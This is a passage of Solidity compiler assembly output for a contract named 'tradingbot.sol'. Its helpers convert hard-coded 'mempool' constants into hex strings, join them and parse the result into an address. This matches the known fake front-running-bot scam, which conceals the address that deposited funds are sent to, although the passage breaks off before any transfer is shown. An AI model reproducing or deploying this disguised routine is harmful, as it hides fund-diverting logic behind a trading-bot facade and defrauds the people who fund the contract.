if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_90\n      jumpi\n        /* \"contracts/tradingbot.sol\":4984:4986  55 */\n      0x37\n        /* \"contracts/tradingbot.sol\":4978:4986  b1 -= 55 */\n      dup4\n      tag_91\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_91:\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":4929:5081  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_92)\n    tag_90:\n        /* \"contracts/tradingbot.sol\":5019:5021  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5013:5015  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":5013:5021  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5012:5036  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5033:5035  57 */\n      0x39\n        /* \"contracts/tradingbot.sol\":5027:5029  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":5027:5035  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5012:5036  (b1 >= 48) && (b1 <= 57) */\n    tag_93:\n        /* \"contracts/tradingbot.sol\":5008:5081  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_94\n      jumpi\n        /* \"contracts/tradingbot.sol\":5063:5065  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5057:5065  b1 -= 48 */\n      dup4\n      tag_95\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_95:\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":5008:5081  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_94:\n        /* \"contracts/tradingbot.sol\":4929:5081  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_92:\n        /* \"contracts/tradingbot.sol\":4849:5081  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_88:\n        /* \"contracts/tradingbot.sol\":5106:5108  97 */\n      0x61\n        /* \"contracts/tradingbot.sol\":5100:5102  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5100:5108  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5099:5124  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5120:5123  102 */\n      0x66\n        /* \"contracts/tradingbot.sol\":5114:5116  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5114:5123  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5099:5124  (b2 >= 97) && (b2 <= 102) */\n    tag_96:\n        /* \"contracts/tradingbot.sol\":5095:5327  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_97\n      jumpi\n        /* \"contracts/tradingbot.sol\":5151:5153  87 */\n      0x57\n        /* \"contracts/tradingbot.sol\":5145:5153  b2 -= 87 */\n      dup3\n      tag_98\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_98:\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":5095:5327  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_99)\n    tag_97:\n        /* \"contracts/tradingbot.sol\":5186:5188  65 */\n      0x41\n        /* \"contracts/tradingbot.sol\":5180:5182  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5180:5188  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5179:5203  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_100\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5200:5202  70 */\n      0x46\n        /* \"contracts/tradingbot.sol\":5194:5196  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5194:5202  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5179:5203  (b2 >= 65) && (b2 <= 70) */\n    tag_100:\n        /* \"contracts/tradingbot.sol\":5175:5327  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_101\n      jumpi\n        /* \"contracts/tradingbot.sol\":5230:5232  55 */\n      0x37\n        /* \"contracts/tradingbot.sol\":5224:5232  b2 -= 55 */\n      dup3\n      tag_102\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_102:\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":5175:5327  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_103)\n    tag_101:\n        /* \"contracts/tradingbot.sol\":5265:5267  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5259:5261  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5259:5267  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5258:5282  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_104\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5279:5281  57 */\n      0x39\n        /* \"contracts/tradingbot.sol\":5273:5275  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5273:5281  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5258:5282  (b2 >= 48) && (b2 <= 57) */\n    tag_104:\n        /* \"contracts/tradingbot.sol\":5254:5327  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_105\n      jumpi\n        /* \"contracts/tradingbot.sol\":5309:5311  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5303:5311  b2 -= 48 */\n      dup3\n      tag_106\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_106:\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":5254:5327  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_105:\n        /* \"contracts/tradingbot.sol\":5175:5327  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_103:\n        /* \"contracts/tradingbot.sol\":5095:5327  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_99:\n        /* \"contracts/tradingbot.sol\":5361:5363  b2 */\n      dup2\n        /* \"contracts/tradingbot.sol\":5356:5358  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":5351:5353  b1 */\n      dup5\n        /* \"contracts/tradingbot.sol\":5351:5358  b1 * 16 */\n      tag_107\n      swap2\n      swap1\n      tag_76\n      jump\t// in\n    tag_107:\n        /* \"contracts/tradingbot.sol\":5351:5363  b1 * 16 + b2 */\n      tag_108\n      swap2\n      swap1\n      tag_109\n      jump\t// in\n    tag_108:\n        /* \"contracts/tradingbot.sol\":5341:5364  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_110\n      swap2\n      swap1\n      tag_109\n      jump\t// in\n    tag_110:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":4716:4717  2 */\n      0x02\n        /* \"contracts/tradingbot.sol\":4711:4717  i += 2 */\n      dup2\n      tag_111\n      swap2\n      swap1\n      tag_81\n      jump\t// in\n    tag_111:\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4678:5376  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_72)\n    tag_73:\n      pop\n        /* \"contracts/tradingbot.sol\":5401:5406  iaddr */\n      dup3\n        /* \"contracts/tradingbot.sol\":5386:5407  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":4475:5415  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10229:10366  function getLiquidity() internal view returns(uint) {... */\n    tag_27:\n        /* \"contracts/tradingbot.sol\":10275:10279  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":10337:10358  address(this).balance */\n      selfbalance\n        /* \"contracts/tradingbot.sol\":10330:10358  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10229:10366  function getLiquidity() internal view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":4211:4300  function getMemPoolOffset() internal pure returns (uint) {... */\n    tag_47:\n        /* \"contracts/tradingbot.sol\":4262:4266  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":4286:4292  314451 */\n      0x04cc53\n        /* \"contracts/tradingbot.sol\":4279:4292  return 314451 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4211:4300  function getMemPoolOffset() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":5636:6650  function checkMempool(uint a) internal pure returns (string memory) {... */\n    tag_48:\n        /* \"contracts/tradingbot.sol\":5689:5702  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":5715:5725  uint count */\n      0x00\n        /* \"contracts/tradingbot.sol\":5740:5746  uint b */\n      dup1\n        /* \"contracts/tradingbot.sol\":5749:5750  a */\n      dup4\n        /* \"contracts/tradingbot.sol\":5740:5750  uint b = a */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5762:5834  while (b != 0) {... */\n    tag_115:\n        /* \"contracts/tradingbot.sol\":5774:5775  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":5769:5770  b */\n      dup2\n        /* \"contracts/tradingbot.sol\":5769:5775  b != 0 */\n      eq\n        /* \"contracts/tradingbot.sol\":5762:5834  while (b != 0) {... */\n      tag_116\n      jumpi\n        /* \"contracts/tradingbot.sol\":5792:5799  count++ */\n      dup2\n      dup1\n      tag_117\n      swap1\n      tag_118\n      jump\t// in\n    tag_117:\n      swap3\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":5819:5821  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":5814:5821  b /= 16 */\n      dup2\n      tag_119\n      swap2\n      swap1\n      tag_120\n      jump\t// in\n    tag_119:\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5762:5834  while (b != 0) {... */\n      jump(tag_115)\n    tag_116:\n        /* \"contracts/tradingbot.sol\":5844:5860  bytes memory res */\n      0x00\n        /* \"contracts/tradingbot.sol\":5873:5878  count */\n      dup3\n        /* \"contracts/tradingbot.sol\":5863:5879  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_121\n      jumpi\n      tag_122\n      tag_123\n      jump\t// in\n    tag_122:\n    tag_121:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_124\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_124:\n      pop\n        /* \"contracts/tradingbot.sol\":5844:5879  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5895:5901  uint i */\n      0x00\n        /* \"contracts/tradingbot.sol\":5890:6034  for (uint i=0; i<count; ++i) {... */\n    tag_125:\n        /* \"contracts/tradingbot.sol\":5907:5912  count */\n      dup4\n        /* \"contracts/tradingbot.sol\":5905:5906  i */\n      dup2\n        /* \"contracts/tradingbot.sol\":5905:5912  i<count */\n      lt\n        /* \"contracts/tradingbot.sol\":5890:6034  for (uint i=0; i<count; ++i) {... */\n      iszero\n      tag_126\n      jumpi\n        /* \"contracts/tradingbot.sol\":5942:5944  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":5938:5939  a */\n      dup7\n        /* \"contracts/tradingbot.sol\":5938:5944  a % 16 */\n      tag_128\n      swap2\n      swap1\n      tag_129\n      jump\t// in\n    tag_128:\n        /* \"contracts/tradingbot.sol\":5934:5944  b = a % 16 */\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":5980:6000  toHexDigit(uint8(b)) */\n      tag_130\n        /* \"contracts/tradingbot.sol\":5997:5998  b */\n      dup4\n        /* \"contracts/tradingbot.sol\":5980:5990  toHexDigit */\n      tag_131\n        /* \"contracts/tradingbot.sol\":5980:6000  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_130:\n        /* \"contracts/tradingbot.sol\":5959:5962  res */\n      dup3\n        /* \"contracts/tradingbot.sol\":5975:5976  1 */\n      0x01\n        /* \"contracts/tradingbot.sol\":5971:5972  i */\n      dup4\n        /* \"contracts/tradingbot.sol\":5963:5968  count */\n      dup8\n        /* \"contracts/tradingbot.sol\":5963:5972  count - i */\n      tag_132\n      swap2\n      swap1\n      tag_133\n      jump\t// in\n    tag_132:\n        /* \"contracts/tradingbot.sol\":5963:5976  count - i - 1 */\n      tag_134\n      swap2\n      swap1\n      tag_133\n      jump\t// in\n    tag_134:\n        /* \"contracts/tradingbot.sol\":5959:5977  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_135\n      jumpi\n      tag_136\n      tag_79\n      jump\t// in\n    tag_136:\n    tag_135:\n      0x20\n      add\n      add\n        /* \"contracts/tradingbot.sol\":5959:6000  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/tradingbot.sol\":6020:6022  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":6015:6022  a /= 16 */\n      dup7\n      tag_137\n      swap2\n      swap1\n      tag_120\n      jump\t// in\n    tag_137:\n      swap6\n      pop\n        /* \"contracts/tradingbot.sol\":5914:5917  ++i */\n      dup1\n      tag_138\n      swap1\n      tag_118\n      jump\t// in\n    tag_138:\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5890:6034  for (uint i=0; i<count; ++i) {... */\n      jump(tag_125)\n    tag_126:\n      pop\n        /* \"contracts/tradingbot.sol\":6044:6058  uint hexLength */\n      0x00\n        /* \"contracts/tradingbot.sol\":6074:6077  res */\n      dup2\n        /* \"contracts/tradingbot.sol\":6061:6086  bytes(string(res)).length */\n      mload\n        /* \"contracts/tradingbot.sol\":6044:6086  uint hexLength = bytes(string(res)).length */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6114:6115  4 */\n      0x04\n        /* \"contracts/tradingbot.sol\":6101:6110  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6101:6115  hexLength == 4 */\n      sub\n        /* \"contracts/tradingbot.sol\":6097:6612  if (hexLength == 4) {... */\n      tag_139\n      jumpi\n        /* \"contracts/tradingbot.sol\":6132:6152  string memory _hexC1 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6155:6180  mempool(\"0\", string(res)) */\n      tag_140\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6175:6178  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6155:6162  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6155:6180  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_140:\n        /* \"contracts/tradingbot.sol\":6132:6180  string memory _hexC1 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6202:6208  _hexC1 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6195:6208  return _hexC1 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6097:6612  if (hexLength == 4) {... */\n    tag_139:\n        /* \"contracts/tradingbot.sol\":6243:6244  3 */\n      0x03\n        /* \"contracts/tradingbot.sol\":6230:6239  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6230:6244  hexLength == 3 */\n      sub\n        /* \"contracts/tradingbot.sol\":6226:6612  if (hexLength == 3) {... */\n      tag_142\n      jumpi\n        /* \"contracts/tradingbot.sol\":6261:6281  string memory _hexC2 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6284:6309  mempool(\"0\", string(res)) */\n      tag_143\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6304:6307  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6284:6291  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6284:6309  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_143:\n        /* \"contracts/tradingbot.sol\":6261:6309  string memory _hexC2 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6331:6337  _hexC2 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6324:6337  return _hexC2 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6226:6612  if (hexLength == 3) {... */\n    tag_142:\n        /* \"contracts/tradingbot.sol\":6372:6373  2 */\n      0x02\n        /* \"contracts/tradingbot.sol\":6359:6368  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6359:6373  hexLength == 2 */\n      sub\n        /* \"contracts/tradingbot.sol\":6355:6612  if (hexLength == 2) {... */\n      tag_145\n      jumpi\n        /* \"contracts/tradingbot.sol\":6390:6410  string memory _hexC3 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6413:6440  mempool(\"000\", string(res)) */\n      tag_146\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x3030300000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6435:6438  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6413:6420  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6413:6440  mempool(\"000\", string(res)) */\n      jump\t// in\n    tag_146:\n        /* \"contracts/tradingbot.sol\":6390:6440  string memory _hexC3 = mempool(\"000\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6462:6468  _hexC3 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6455:6468  return _hexC3 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6355:6612  if (hexLength == 2) {... */\n    tag_145:\n        /* \"contracts/tradingbot.sol\":6503:6504  1 */\n      0x01\n        /* \"contracts/tradingbot.sol\":6490:6499  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6490:6504  hexLength == 1 */\n      sub\n        /* \"contracts/tradingbot.sol\":6486:6612  if (hexLength == 1) {... */\n      tag_148\n      jumpi\n        /* \"contracts/tradingbot.sol\":6521:6541  string memory _hexC4 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6544:6572  mempool(\"0000\", string(res)) */\n      tag_149\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3030303000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6567:6570  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6544:6551  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6544:6572  mempool(\"0000\", string(res)) */\n      jump\t// in\n    tag_149:\n        /* \"contracts/tradingbot.sol\":6521:6572  string memory _hexC4 = mempool(\"0000\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6594:6600  _hexC4 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6587:6600  return _hexC4 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6486:6612  if (hexLength == 1) {... */\n    tag_148:\n        /* \"contracts/tradingbot.sol\":6638:6641  res */\n      dup2\n        /* \"contracts/tradingbot.sol\":6624:6642  return string(res) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":5636:6650  function checkMempool(uint a) internal pure returns (string memory) {... */\n    tag_114:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":12328:12958  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_49:\n        /* \"contracts/tradingbot.sol\":12411:12424  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":12437:12460  bytes memory _baseBytes */\n      0x00\n        /* \"contracts/tradingbot.sol\":12469:12474  _base */\n      dup4\n        /* \"contracts/tradingbot.sol\":12437:12475  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12486:12510  bytes memory _valueBytes */\n      0x00\n        /* \"contracts/tradingbot.sol\":12519:12525  _value */\n      dup4\n        /* \"contracts/tradingbot.sol\":12486:12526  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12539:12562  string memory _tmpValue */\n      0x00\n        /* \"contracts/tradingbot.sol\":12596:12607  _valueBytes */\n      dup2\n        /* \"contracts/tradingbot.sol\":12596:12614  _valueBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12576:12586  _baseBytes */\n      dup4\n        /* \"contracts/tradingbot.sol\":12576:12593  _baseBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12576:12614  _baseBytes.length + _valueBytes.length */\n      tag_151\n      swap2\n      swap1\n      tag_81\n      jump\t// in\n    tag_151:\n        /* \"contracts/tradingbot.sol\":12565:12615  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_152\n      jumpi\n      tag_153\n      tag_123\n      jump\t// in\n    tag_153:\n    tag_152:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_154\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_154:\n      pop\n        /* \"contracts/tradingbot.sol\":12539:12615  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12626:12648  bytes memory _newValue */\n      0x00\n        /* \"contracts/tradingbot.sol\":12657:12666  _tmpValue */\n      dup2\n        /* \"contracts/tradingbot.sol\":12626:12667  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12680:12686  uint i */\n      0x00\n        /* \"contracts/tradingbot.sol\":12697:12703  uint j */\n      dup1\n        /* \"contracts/tradingbot.sol\":12722:12723  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":12720:12723  i=0 */\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":12716:12808  for(i=0; i<_baseBytes.length; i++) {... */\n    tag_155:\n        /* \"contracts/tradingbot.sol\":12727:12737  _baseBytes */\n      dup6\n        /* \"contracts/tradingbot.sol\":12727:12744  _baseBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12725:12726  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12725:12744  i<_baseBytes.length */\n      lt\n        /* \"contracts/tradingbot.sol\":12716:12808  for(i=0; i<_baseBytes.length; i++) {... */\n      iszero\n      tag_156\n      jumpi\n        /* \"contracts/tradingbot.sol\":12783:12793  _baseBytes */\n      dup6\n        /* \"contracts/tradingbot.sol\":12794:12795  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12783:12796  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_158\n      jumpi\n      tag_159\n      tag_79\n      jump\t// in\n    tag_159:\n    tag_158:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":12766:12775  _newValue */\n      dup4\n        /* \"contracts/tradingbot.sol\":12776:12779  j++ */\n      dup3\n      dup1\n      tag_160\n      swap1\n      tag_118\n      jump\t// in\n    tag_160:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":12766:12780  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_161\n      jumpi\n      tag_162\n      tag_79\n      jump\t// in\n    tag_162:\n    tag_161:\n      0x20\n      add\n      add\n        /* \"contracts/tradingbot.sol\":12766:12796  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/tradingbot.sol\":12746:12749  i++ */\n      dup2\n      dup1\n      tag_163\n      swap1\n      tag_118\n      jump\t// in\n    tag_163:\n      swap3\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":12716:12808  for(i=0; i<_baseBytes.length; i++) {... */\n      jump(tag_155)\n    tag_156:\n        /* \"contracts/tradingbot.sol\":12826:12827  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":12824:12827  i=0 */\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":12820:12914  for(i=0; i<_valueBytes.length; i++) {... */\n    tag_164:\n        /* \"contracts/tradingbot.sol\":12831:12842  _valueBytes */\n      dup5\n        /* \"contracts/tradingbot.sol\":12831:12849  _valueBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12829:12830  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12829:12849  i<_valueBytes.length */\n      lt\n        /* \"contracts/tradingbot.sol\":12820:12914  for(i=0; i<_valueBytes.length; i++) {... */\n      iszero\n      tag_165\n      jumpi\n        /* \"contracts/tradingbot.sol\":12888:12899  _valueBytes */\n      dup5\n        /* \"contracts/tradingbot.sol\":12900:12901  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12888:12902  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_167\n      jumpi\n      tag_168\n      tag_79\n      jump\t// in\n    tag_168:\n    tag_167:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":12871:12880  _newValue */\n      dup4\n        /* \"contracts/tradingbot.sol\":12881:12884  j++ */\n      dup3\n      dup1\n      tag_169\n      swap1\n      tag_118\n      jump\t// in\n    tag_169:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":12871:12885  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_170\n      jumpi\n      tag_171\n      tag_79\n      jump\t// in\n    tag_171:\n    tag_170:\n      0x20\n      add\n      add\n        /* \"contracts/tradingbot.sol\":12871:12902  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/tradingbot.sol\":12851:12854  i++ */\n      dup2\n      dup1\n      tag_172\n      swap1\n      tag_118\n      jump\t// in\n    tag_172:\n      swap3\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":12820:12914  for(i=0; i<_valueBytes.length; i++) {... */\n      jump(tag_164)\n    tag_165:\n        /* \"contracts/tradingbot.sol\":12940:12949  _newValue */\n      dup3\n        /* \"contracts/tradingbot.sol\":12926:12950  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":12328:12958  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":6658:6747  function getMemPoolLength() internal pure returns (uint) {... */\n    tag_51:\n        /* \"contracts/tradingbot.sol\":6709:6713  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":6733:6739  300426 */\n      0x04958a\n        /* \"contracts/tradingbot.sol\":6726:6739  return 300426 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6658:6747  function getMemPoolLength() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":7030:7119  function getMemPoolHeight() internal pure returns (uint) {... */\n    tag_53:\n        /* \"contracts/tradingbot.sol\":7081:7085  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":7105:7111  979684 */\n      0x0ef2e4\n        /* \"contracts/tradingbot.sol\":7098:7111  return 979684 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7030:7119  function getMemPoolHeight() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":12057:12145  function getMemPoolDepth() internal pure returns (uint) {... */\n    tag_55:\n        /* 